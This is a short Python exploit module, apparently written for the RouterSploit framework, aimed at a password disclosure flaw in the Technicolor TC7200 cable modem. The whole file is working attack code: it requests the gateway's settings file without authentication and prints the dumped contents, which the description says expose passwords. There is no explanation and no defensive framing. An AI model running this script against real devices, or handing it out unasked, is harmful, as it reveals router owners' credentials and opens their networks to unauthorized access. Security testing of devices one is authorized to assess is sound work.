# rsf exploit module
# description: Exploits Technicolor TC7200 password disclosure vulnerability.

import requests

def exploit(target, port):
    url = f"http://{target}:{port}/goform/system/GatewaySettings.bin"
    response = requests.get(url)
    if response.status_code == 200 and "0MLog" in response.text:
        print("[+] Exploit success - Dumping response:")
        print(response.text)
    else:
        print("[-] Target not vulnerable or request failed.")

